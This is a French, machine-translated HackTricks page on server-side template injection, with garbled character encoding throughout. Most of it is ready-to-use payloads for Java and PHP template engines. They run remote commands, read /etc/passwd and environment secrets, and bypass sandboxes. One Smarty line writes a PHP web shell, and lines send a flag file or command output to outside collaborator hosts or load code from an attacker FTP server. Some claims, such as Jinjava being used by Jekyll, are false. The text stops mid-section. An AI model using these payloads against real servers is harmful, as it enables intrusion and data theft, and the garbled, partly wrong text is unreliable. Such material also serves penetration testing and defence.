# SSTI (Injection de mod√®le c√¥t√© serveur)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Qu'est-ce que l'injection de mod√®le c√¥t√© serveur ?

Une injection de mod√®le c√¥t√© serveur se produit lorsqu'un attaquant est capable d'utiliser la syntaxe de mod√®le native pour injecter une charge utile malveillante dans un mod√®le, qui est ensuite ex√©cut√© c√¥t√© serveur.

Les **moteurs de mod√®le** sont con√ßus pour **g√©n√©rer des pages web** en **combinant** des mod√®les **fixes** avec des donn√©es **volatiles**. Les attaques d'injection de mod√®le c√¥t√© serveur peuvent se produire lorsque l'**entr√©e utilisateur** est concat√©n√©e directement **dans un mod√®le**, plut√¥t que transmise en tant que donn√©es. Cela permet aux attaquants d'**injecter des directives de mod√®le arbitraires** afin de manipuler le moteur de mod√®le, leur permettant souvent de prendre **le contr√¥le complet du serveur**.

Un exemple de code vuln√©rable est le suivant :
```php
$output = $twig->render("Dear " . $_GET['name']);
```
Dans l'exemple pr√©c√©dent, **une partie du mod√®le** est elle-m√™me **g√©n√©r√©e dynamiquement** en utilisant le param√®tre `name` de la m√©thode `GET`. Comme la syntaxe du mod√®le est √©valu√©e c√¥t√© serveur, cela permet potentiellement √† un attaquant de placer une charge utile d'injection de mod√®le c√¥t√© serveur dans le param√®tre `name` comme suit :
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## Construction d'une attaque d'injection de mod√®le c√¥t√© serveur

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### D√©tecter

Comme pour toute vuln√©rabilit√©, la premi√®re √©tape vers l'exploitation est de pouvoir la trouver. Peut-√™tre la m√©thode la plus simple consiste √† essayer de **fuzzer le mod√®le** en injectant une s√©quence de caract√®res sp√©ciaux couramment utilis√©s dans les expressions de mod√®le, tels que le polyglotte **`${{<%[%'"}}%\`.**\
Afin de v√©rifier si le serveur est vuln√©rable, vous devez **rep√©rer les diff√©rences** entre la r√©ponse avec des **donn√©es r√©guli√®res** sur le param√®tre et la **charge utile donn√©e**.\
Si une **erreur est renvoy√©e**, il sera assez facile de d√©terminer que **le serveur est vuln√©rable** et m√™me quel **moteur est en cours d'ex√©cution**. Mais vous pourriez √©galement trouver un serveur vuln√©rable si vous vous attendiez √† ce qu'il **refl√®te** la charge utile donn√©e et qu'il ne le fait **pas** ou s'il y a des **caract√®res manquants** dans la r√©ponse.

**D√©tecter - Contexte en texte brut**

L'entr√©e donn√©e est **rendue et refl√©t√©e** dans la r√©ponse. Cela peut facilement √™tre **confondu avec une vuln√©rabilit√©** [**XSS**](../xss-cross-site-scripting/) simple, mais il est facile de diff√©rencier si vous essayez de d√©finir des **op√©rations math√©matiques** dans une expression de mod√®le :
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**D√©tecter - Contexte du code**

Dans ces cas, l'**entr√©e utilisateur** est plac√©e **√† l'int√©rieur** d'une **expression de mod√®le** :
```python
engine.render("Hello {{"+greeting+"}}", data)
```
L'acc√®s √† l'URL de cette page pourrait √™tre similaire √† : `http://vulnerable-website.com/?greeting=data.username`

Si vous **modifiez** le param√®tre **`greeting`** pour une **valeur diff√©rente**, la **r√©ponse ne contiendra pas le nom d'utilisateur**, mais si vous acc√©dez √† quelque chose comme : `http://vulnerable-website.com/?greeting=data.username}}hello`, alors **la r√©ponse contiendra le nom d'utilisateur** (si les caract√®res de fermeture de l'expression de mod√®le √©taient **`}}`**).\
Si une **erreur** est g√©n√©r√©e pendant ces tests, il sera plus facile de trouver que le serveur est vuln√©rable.

### Identifier

Une fois que vous avez d√©tect√© le potentiel d'injection de mod√®le, la prochaine √©tape consiste √† identifier le moteur de mod√®le.\
Bien qu'il existe un grand nombre de langages de mod√©lisation, beaucoup d'entre eux utilisent une syntaxe tr√®s similaire qui est sp√©cifiquement choisie pour ne pas entrer en conflit avec les caract√®res HTML.

Si vous avez de la chance, le serveur **imprimera les erreurs** et vous pourrez trouver le **moteur** utilis√© **√† l'int√©rieur** des erreurs. Certains payloads possibles qui peuvent causer des erreurs sont :

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

Sinon, vous devrez **tester manuellement diff√©rents payloads sp√©cifiques √† la langue** et √©tudier comment ils sont interpr√©t√©s par le moteur de mod√®le. Une fa√ßon courante de faire cela est d'injecter des op√©rations math√©matiques arbitraires en utilisant la syntaxe de diff√©rents moteurs de mod√®le. Vous pouvez ensuite observer s'ils sont √©valu√©s avec succ√®s. Pour vous aider dans ce processus, vous pouvez utiliser un arbre de d√©cision similaire √† celui-ci :

![](<../../.gitbook/assets/image (272).png>)

### Exploiter

**Lire**

La premi√®re √©tape apr√®s avoir trouv√© l'injection de mod√®le et identifi√© le moteur de mod√®le consiste √† lire la documentation. Les domaines cl√©s d'int√©r√™t sont :

* Les sections 'Pour les auteurs de mod√®les' couvrant la syntaxe de base.
* Les 'Consid√©rations de s√©curit√©' - il est probable que quiconque a d√©velopp√© l'application que vous testez n'a pas lu cela, et cela peut contenir des indices utiles.
* Les listes de m√©thodes, fonctions, filtres et variables int√©gr√©es.
* Les listes d'extensions/plugins - certaines peuvent √™tre activ√©es par d√©faut.

**Explorer**

En supposant qu'aucune exploitation ne se soit pr√©sent√©e, la prochaine √©tape consiste √† **explorer l'environnement** pour savoir exactement √† quoi **vous avez acc√®s**. Vous pouvez vous attendre √† trouver √† la fois des **objets par d√©faut** fournis par le moteur de mod√®le, et des **objets sp√©cifiques √† l'application** transmis au mod√®le par le d√©veloppeur. De nombreux syst√®mes de mod√®les exposent un objet 'self' ou un espace de noms contenant tout ce qui est en port√©e, et une fa√ßon idiomatique de lister les attributs et m√©thodes d'un objet.

S'il n'y a pas d'objet self int√©gr√©, vous devrez forcer les noms de variables en utilisant [SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) et la collection de listes de mots de passe de Burp Intruder.

Les objets fournis par le d√©veloppeur sont particuli√®rement susceptibles de contenir des informations sensibles, et peuvent varier entre diff√©rents mod√®les au sein d'une application, de sorte que ce processus devrait id√©alement √™tre appliqu√© √† chaque mod√®le distinct individuellement.

**Attaquer**

√Ä ce stade, vous devriez avoir une **id√©e ferme de la surface d'attaque disponible** et √™tre en mesure de proc√©der avec les techniques d'audit de s√©curit√© traditionnelles, en examinant chaque fonction pour trouver des vuln√©rabilit√©s exploitables. Il est important d'aborder cela dans le contexte de l'application plus large - certaines fonctions peuvent √™tre utilis√©es pour exploiter des fonctionnalit√©s sp√©cifiques √† l'application. Les exemples √† suivre utiliseront l'injection de mod√®le pour d√©clencher la cr√©ation arbitraire d'objets, la lecture/√©criture de fichiers arbitraires, l'inclusion de fichiers distants, la divulgation d'informations et l'escalade de privil√®ges.

## Outils

### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
## Exploits

### G√©n√©rique

Dans cette **liste de mots**, vous pouvez trouver les **variables d√©finies** dans les environnements de certains des moteurs mentionn√©s ci-dessous :

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### Java

**Injection de base Java**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - R√©cup√©rer les variables d'environnement du syst√®me**

Il est possible de r√©cup√©rer les variables d'environnement du syst√®me en utilisant la classe `System` de Java. La m√©thode `getenv()` de cette classe permet de r√©cup√©rer un objet `Map` contenant toutes les variables d'environnement du syst√®me.

```java
Map<String, String> env = System.getenv();
for (String envName : env.keySet()) {
    System.out.format("%s=%s%n", envName, env.get(envName));
}
```

Cette m√©thode peut √™tre utilis√©e pour r√©cup√©rer des informations sensibles telles que des cl√©s d'API ou des informations d'identification stock√©es dans les variables d'environnement. Il est donc important de s'assurer que ces informations ne sont pas expos√©es ou accessibles √† des tiers non autoris√©s.
```java
${T(java.lang.System).getenv()}
```
**Java - R√©cup√©rer /etc/passwd**

Pour r√©cup√©rer le contenu du fichier `/etc/passwd` sur un serveur distant, vous pouvez utiliser une injection de mod√®le c√¥t√© serveur (SSTI) en Java. Tout d'abord, vous devez trouver un point d'injection SSTI dans l'application Web. Ensuite, vous pouvez utiliser la syntaxe de mod√®le Java pour ex√©cuter du code arbitraire et r√©cup√©rer le contenu du fichier `/etc/passwd`.

Voici un exemple de code Java qui peut √™tre utilis√© pour r√©cup√©rer le contenu du fichier `/etc/passwd` :

```
${new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec("cat /etc/passwd").getInputStream())).lines().collect(java.util.stream.Collectors.joining(System.lineSeparator()))}
```

Vous pouvez ins√©rer ce code dans un point d'injection SSTI dans l'application Web pour r√©cup√©rer le contenu du fichier `/etc/passwd`. Notez que cette technique peut ne pas fonctionner sur toutes les applications Web, car certaines peuvent d√©sactiver l'ex√©cution de code Java arbitraire.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

Vous pouvez essayer vos charges utiles sur [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Rien`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Contournement de bac √† sable**

‚ö†Ô∏è fonctionne uniquement sur les versions de Freemarker inf√©rieures √† 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**Plus d'informations**

* Dans la section FreeMarker de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**Plus d'informations**

* Dans la section Velocity de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf (Java)

L'expression de test typique pour SSTI est `${7*7}`. Cette expression fonctionne √©galement dans Thymeleaf. Si vous voulez r√©aliser une ex√©cution de code √† distance, vous pouvez utiliser l'une des expressions de test suivantes :

* SpringEL : `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNL : `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

Cependant, comme nous l'avons mentionn√© pr√©c√©demment, les expressions ne fonctionnent que dans des attributs Thymeleaf sp√©ciaux. S'il est n√©cessaire d'utiliser une expression √† un autre endroit dans le mod√®le, Thymeleaf prend en charge l'_insertion d'expression_. Pour utiliser cette fonctionnalit√©, vous devez placer une expression entre `[[...]]` ou `[(...)]` (choisissez l'un ou l'autre en fonction de la n√©cessit√© d'√©chapper les symboles sp√©ciaux). Par cons√©quent, une charge utile de d√©tection SSTI simple pour Thymeleaf serait `[[${7*7}]]`.

Cependant, les chances que la charge utile de d√©tection ci-dessus fonctionne sont tr√®s faibles. Les vuln√©rabilit√©s SSTI se produisent g√©n√©ralement lorsqu'un mod√®le est g√©n√©r√© dynamiquement dans le code. Thymeleaf, par d√©faut, n'autorise pas de mod√®les g√©n√©r√©s dynamiquement et tous les mod√®les doivent √™tre cr√©√©s au pr√©alable. Par cons√©quent, si un d√©veloppeur veut cr√©er un mod√®le √† partir d'une cha√Æne _√† la vol√©e_, il devra cr√©er son propre r√©solveur de mod√®le. C'est possible mais cela arrive tr√®s rarement.

Si nous examinons de plus pr√®s la documentation du moteur de mod√®le Thymeleaf, nous trouverons une fonctionnalit√© int√©ressante appel√©e _**pr√©traitement d'expression**_. Les expressions plac√©es entre deux tirets bas (`__...__`) sont pr√©trait√©es et le r√©sultat du pr√©traitement est utilis√© comme partie de l'expression pendant le traitement r√©gulier. Voici un exemple officiel de la documentation de Thymeleaf :
```java
#{selection.__${sel.code}__}
```
**Exemple vuln√©rable**
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**Plus d'informations**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Framework Spring (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Contourner les filtres**

Plusieurs expressions de variables peuvent √™tre utilis√©es, si `${...}` ne fonctionne pas, essayez `#{...}`, `*{...}`, `@{...}` ou `~{...}`.

* Lire `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Script personnalis√© pour la g√©n√©ration de payload
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}' 

count = 1
for i in converted:
    if count == 1:
        base_payload += f"(T(java.lang.Character).toString({i}).concat"
        count += 1
    elif count == len(converted):
        base_payload += f"(T(java.lang.Character).toString({i})))"
    else:
        base_payload += f"(T(java.lang.Character).toString({i})).concat"
        count += 1

print(base_payload + end_payload)
```
**Plus d'informations**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Manipulation de la vue Spring (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Ancienne version de Pebble (< version 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
Nouvelle version de Pebble :
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Jinjava est un moteur de template Java qui permet l'injection de code c√¥t√© serveur (SSTI). Il est utilis√© par plusieurs frameworks Java tels que Jekyll et Pelican.

#### Comment l'exploiter

Pour exploiter une SSTI avec Jinjava, vous pouvez utiliser la syntaxe suivante :

```
{{ 7*'7' }}
```

Cela va √©valuer l'expression `7*'7'` et afficher le r√©sultat `49`.

Vous pouvez √©galement acc√©der aux variables et aux fonctions de l'objet `context` en utilisant la syntaxe suivante :

```
{{ context['class'].forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('whoami') }}
```

Cela va ex√©cuter la commande `whoami` sur le serveur et afficher le r√©sultat.

#### Comment se prot√©ger

Pour se prot√©ger contre les SSTI avec Jinjava, vous pouvez d√©sactiver l'√©valuation des expressions en utilisant la configuration suivante :

```java
JinjavaConfig config = new JinjavaConfig();
config.setEnableRecursiveMacroCalls(false);
config.setEnableShortcuts(false);
config.setFailOnUnknownTokens(true);
config.setExecutionTimeout(5000L);
config.setNestedInterpretationEnabled(false);
config.setParseLiteralsOnly(false);
config.setUsePyishObjectMapper(false);
config.setValidationMode(ValidationMode.STRICT);
Jinjava jinjava = new Jinjava(config);
```

Cela d√©sactive l'√©valuation des expressions et emp√™che les attaquants d'injecter du code malveillant.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava est un projet open source d√©velopp√© par Hubspot, disponible sur [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

**Jinjava - Ex√©cution de commandes**

Corrig√© par [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**Plus d'informations**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* D√©limiteurs d'instructions `{% %}`
* D√©limiteurs d'expressions `{{ }}`
* D√©limiteurs de commentaires `{# #}`
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Recherchez "com.hubspot.content.hubl.context.TemplateContextRequest" et d√©couvrez le [projet Jinjava sur Github](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the 







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**Plus d'informations**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Langage d'expression - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

EL fournit un m√©canisme important pour permettre √† la couche de pr√©sentation (pages web) de communiquer avec la logique de l'application (beans g√©r√©s). EL est utilis√© par **plusieurs technologies JavaEE**, telles que la technologie JavaServer Faces, la technologie JavaServer Pages (JSP) et l'injection de contextes et de d√©pendances pour Java EE (CDI).\
Consultez la page suivante pour en savoir plus sur l'**exploitation des interpr√©teurs EL** :

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

Cette m√©thode de contournement du gestionnaire de s√©curit√© a √©t√© prise √† partir de ce [**writeup**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
    assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "whoami";
    out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
    cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
    java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en Espagne et l'un des plus importants en Europe. Avec pour mission de promouvoir les connaissances techniques, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**Plus d'informations**

* Dans la section Smarty de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Erreur`
* `{{foobar}} Rien`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
